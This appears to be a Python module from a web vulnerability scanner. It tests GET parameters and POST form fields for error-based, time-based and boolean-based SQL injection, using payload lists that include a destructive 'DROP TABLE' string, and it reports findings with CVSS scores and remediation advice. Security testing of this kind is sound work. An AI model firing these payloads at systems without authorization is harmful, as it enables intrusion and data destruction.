"""SQL Injection detection module.

Tests error-based, time-based blind, and boolean-based blind SQL injection
against all discovered parameters.
"""

from __future__ import annotations

import re
import time
from typing import Any
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import httpx

from scanner.utils.logger import get_logger

log = get_logger("sqli")

# ── Payloads ────────────────────────────────────────────────────────
ERROR_PAYLOADS = [
    "' OR 1=1--",
    "\" OR 1=1--",
    "' OR '1'='1",
    "1' ORDER BY 1--",
    "1 UNION SELECT NULL--",
    "'; DROP TABLE test--",
    "1' AND 1=CONVERT(int,(SELECT @@version))--",
]

TIME_PAYLOADS = [
    ("' OR SLEEP(5)--", 5),
    ("' OR pg_sleep(5)--", 5),
    ("'; WAITFOR DELAY '0:0:5'--", 5),
]

BOOLEAN_PAYLOADS = [
    ("' OR 1=1--", "' OR 1=2--"),
    ("' AND 1=1--", "' AND 1=2--"),
]

# Database error patterns
_DB_ERROR_PATTERNS = [
    re.compile(r"you have an error in your sql syntax", re.I),
    re.compile(r"warning:.*mysql", re.I),
    re.compile(r"unclosed quotation mark", re.I),
    re.compile(r"quoted string not properly terminated", re.I),
    re.compile(r"ORA-\d{5}", re.I),
    re.compile(r"Microsoft OLE DB Provider", re.I),
    re.compile(r"ODBC SQL Server Driver", re.I),
    re.compile(r"PostgreSQL.*ERROR", re.I),
    re.compile(r"SQLite3::query", re.I),
    re.compile(r"pg_query\(\):", re.I),
    re.compile(r"supplied argument is not a valid MySQL", re.I),
]


def _inject_param(url: str, param: str, payload: str) -> str:
    """Return *url* with *param* replaced by *payload*."""
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]
    new_query = urlencode(qs, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def _check_error_based(
    client: httpx.Client, url: str, param: str
) -> dict[str, Any] | None:
    for payload in ERROR_PAYLOADS:
        target = _inject_param(url, param, payload)
        try:
            resp = client.get(target)
        except httpx.HTTPError:
            continue
        for pat in _DB_ERROR_PATTERNS:
            match = pat.search(resp.text)
            if match:
                log.info("[SQLi] Error-based on %s param=%s payload=%s", url, param, payload)
                return {
                    "type": "error-based",
                    "parameter": param,
                    "payload": payload,
                    "evidence": match.group(0)[:200],
                    "url": url,
                }
    return None


def _check_time_based(
    client: httpx.Client, url: str, param: str, threshold: float = 4.0
) -> dict[str, Any] | None:
    for payload, delay in TIME_PAYLOADS:
        target = _inject_param(url, param, payload)
        try:
            start = time.monotonic()
            client.get(target)
            elapsed = time.monotonic() - start
        except httpx.HTTPError:
            continue
        if elapsed >= threshold:
            log.info("[SQLi] Time-based on %s param=%s (%.1fs)", url, param, elapsed)
            return {
                "type": "time-based blind",
                "parameter": param,
                "payload": payload,
                "evidence": f"Response delayed {elapsed:.1f}s (threshold {threshold}s)",
                "url": url,
            }
    return None


def _check_boolean_based(
    client: httpx.Client, url: str, param: str
) -> dict[str, Any] | None:
    for true_payload, false_payload in BOOLEAN_PAYLOADS:
        try:
            resp_true = client.get(_inject_param(url, param, true_payload))
            resp_false = client.get(_inject_param(url, param, false_payload))
        except httpx.HTTPError:
            continue

        # Significant difference in response length indicates boolean injection
        len_diff = abs(len(resp_true.text) - len(resp_false.text))
        if len_diff > 100 and resp_true.status_code == resp_false.status_code:
            log.info("[SQLi] Boolean-based on %s param=%s", url, param)
            return {
                "type": "boolean-based blind",
                "parameter": param,
                "payload": true_payload,
                "evidence": f"Response length diff: {len_diff} bytes",
                "url": url,
            }
    return None


def test_sqli(
    endpoints: list[str],
    forms: list[dict[str, Any]],
    cookie: str | None = None,
    timeout: float = 15.0,
    quick: bool = False,
) -> list[dict[str, Any]]:
    """Run SQL injection tests against all discovered endpoints and forms.

    When *quick* is True, skip time-based blind tests and limit POST form testing.
    Returns a list of confirmed finding dicts.
    """
    findings: list[dict[str, Any]] = []
    seen: set[tuple[str, str]] = set()  # (endpoint_path, param) dedup
    headers: dict[str, str] = {}
    if cookie:
        headers["Cookie"] = cookie

    with httpx.Client(
        verify=False, timeout=timeout, follow_redirects=True, headers=headers
    ) as client:
        # ── GET parameters ──────────────────────────────────────────
        for url in endpoints:
            params = parse_qs(urlparse(url).query)
            path = urlparse(url).path
            for param in params:
                sig = (path, param)
                if sig in seen:
                    continue
                result = _check_error_based(client, url, param)
                if result:
                    findings.append(_to_finding(result))
                    seen.add(sig)
                    continue
                if not quick:
                    result = _check_time_based(client, url, param)
                    if result:
                        findings.append(_to_finding(result))
                        seen.add(sig)
                        continue
                result = _check_boolean_based(client, url, param)
                if result:
                    findings.append(_to_finding(result))
                    seen.add(sig)

        # ── POST form parameters ────────────────────────────────────
        max_forms = 10 if quick else len(forms)
        post_forms = [f for f in forms if f["method"] == "POST"][:max_forms]
        for form in post_forms:
            action = form["action"]
            action_path = urlparse(action).path
            for inp in form["inputs"]:
                name = inp["name"]
                if not name:
                    continue
                post_sig = (action_path, name)
                if post_sig in seen:
                    continue
                for payload in ERROR_PAYLOADS[:3] if quick else ERROR_PAYLOADS:
                    data = {i["name"]: i["value"] for i in form["inputs"] if i["name"]}
                    data[name] = payload
                    try:
                        resp = client.post(action, data=data)
                    except httpx.HTTPError:
                        continue
                    for pat in _DB_ERROR_PATTERNS:
                        match = pat.search(resp.text)
                        if match:
                            findings.append(_to_finding({
                                "type": "error-based",
                                "parameter": name,
                                "payload": payload,
                                "evidence": match.group(0)[:200],
                                "url": action,
                            }))
                            seen.add(post_sig)
                            break
                    else:
                        continue
                    break  # found for this parameter, skip remaining payloads

    log.info("SQLi scan complete — %d findings", len(findings))
    return findings


def _to_finding(raw: dict[str, Any]) -> dict[str, Any]:
    return {
        "title": f"SQL Injection ({raw['type']}) on {urlparse(raw['url']).path}",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "affected_url": raw["url"],
        "parameter": raw["parameter"],
        "payload": raw["payload"],
        "evidence": raw["evidence"],
        "remediation": "Use parameterized queries / prepared statements. "
                       "Never concatenate user input into SQL strings.",
        "owasp_category": "A05:2025 - Injection",
    }
